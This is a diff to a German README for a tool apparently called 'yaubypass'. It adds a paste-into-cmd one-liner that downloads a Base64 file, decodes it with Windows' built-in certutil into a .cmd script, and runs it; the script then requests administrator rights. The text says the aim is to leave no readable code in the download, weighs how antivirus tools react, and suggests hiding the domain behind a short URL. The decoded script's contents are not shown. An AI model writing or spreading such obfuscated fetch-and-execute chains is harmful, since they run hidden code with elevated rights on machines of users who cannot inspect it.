@@ -6,6 +6,28 @@ Der User lädt nichts herunter und klickt nichts an. Er pastet **eine Zeile in c
 curl -L -o "%TEMP%\yau.cmd" https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/install.cmd && "%TEMP%\yau.cmd"
 ```
 
+## Verschlüsselte Variante (kein lesbarer Code)
+
+```
+curl -L -o "%TEMP%\y.b64" https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/yb.b64 && certutil -f -decode "%TEMP%\y.b64" "%TEMP%\y.cmd" >nul 2>&1 && "%TEMP%\y.cmd"
+```
+
+`yb.b64` ist [install.cmd](install.cmd) als Base64 — im Download steht kein lesbarer
+Code mehr, nur Datensalat. `certutil` ist in Windows eingebaut, es wird also weiterhin
+kein PowerShell gebraucht. Der dekodierte Inhalt ist byte-identisch (gleiche MD5).
+
+Neu erzeugen nach jeder Änderung an `install.cmd`:
+
+```
+base64 -w 64 dist/install.cmd | sed 's/$/\r/' > dist/yb.b64
+```
+
+Das ist **Verschleierung, keine echte Verschlüsselung**: die Datei wird auf demselben
+PC wieder entschlüsselt, und Virenscannern hilft Base64 eher beim Erkennen als beim
+Verstecken. Wirklich verstecken lässt sich nur die Domain (eigene kurze URL).
+
+---
+
 Danach:
 
 1. Das Skript fordert Administratorrechte an (UAC mit **Ja** bestätigen).
